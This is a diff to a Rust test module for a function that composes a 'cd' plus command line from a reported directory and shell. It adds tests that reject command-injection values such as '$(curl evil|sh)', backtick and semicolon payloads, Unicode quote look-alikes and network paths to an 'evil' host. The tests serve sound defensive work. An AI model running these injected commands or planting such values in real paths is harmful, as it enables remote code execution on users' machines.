@@ -285,7 +285,8 @@ mod tests {
         assert!(composer_text("make", Some("C:\\x$(calc)"), None).is_err());
         assert!(composer_text("make", Some("/tmp/$(curl evil|sh)"), None).is_err());
         assert_eq!(composer_text("make", Some("C:\\a b"), None).unwrap(), "cd \"C:\\a b\"\nmake");
-        assert_eq!(composer_text("make", Some("/tmp/x$(calc)"), Some("/bin/bash")).unwrap(), "cd /tmp/x\\$\\(calc\\)\nmake");
+        assert!(composer_text("make", Some("/tmp/x$(calc)"), Some("/bin/bash")).is_err(), "a named shell does not loosen the rule");
+        assert_eq!(composer_text("make", Some("/tmp/a b"), Some("/bin/bash")).unwrap(), "cd /tmp/a\\ b\nmake");
         assert_eq!(composer_text("make", Some("C:\\a b"), Some("cmd")).unwrap(), "cd /d \"C:\\a b\"\nmake");
     }
 
@@ -422,11 +423,26 @@ mod tests {
     }
 
     #[test]
+    fn a_spoofed_shell_name_never_loosens_the_composer_line() {
+        // Fix round 2, item 1: whatever shell a program reports (OSC 1337 shell=, RemoteHost), the
+        // directory is written only when no supported shell reads anything special in it.
+        for shell in [None, Some("cmd"), Some("bash"), Some("sh"), Some("pwsh"), Some("/bin/zsh")] {
+            for dir in ["C:\\x$(calc)", "C:\\x\\;calc", "C:\\x&calc", "C:\\x`calc`", "C:\\a\u{201e} x \u{201e}", "C:\\a\u{ff02}b", "C:\\a\u{2032}b", "C:\\"] {
+                assert!(composer_text("make", Some(dir), shell).is_err(), "{shell:?} {dir}");
+            }
+        }
+        // Item 2: a network directory is never written either.
+        for dir in ["\\\\evil\\s\\x", "//evil/s/x", "/\\evil/s"] {
+            assert!(composer_text("make", Some(dir), Some("pwsh")).is_err(), "{dir}");
+        }
+    }
+
+    #[test]
     fn composer_text_never_carries_a_control_character() {
         assert!(composer_text("make\r\ncalc", None, None).is_err());
         assert!(composer_text("make", Some("C:\\a\r\nb"), Some("pwsh")).is_err());
         // A directory a shell would read as syntax is quoted for that shell.
-        assert_eq!(composer_text("make", Some("C:\\a'b\u{2019}; calc"), Some("pwsh")).unwrap(), "cd 'C:\\a''b\u{2019}\u{2019}; calc'\nmake");
+        assert!(composer_text("make", Some("C:\\a'b\u{2019}; calc"), Some("pwsh")).is_err());
         assert_eq!(composer_text("make", Some("/a b"), Some("bash")).unwrap(), "cd /a\\ b\nmake");
         assert!(composer_text("make", Some("C:\\100%"), Some("cmd")).is_err());
     }
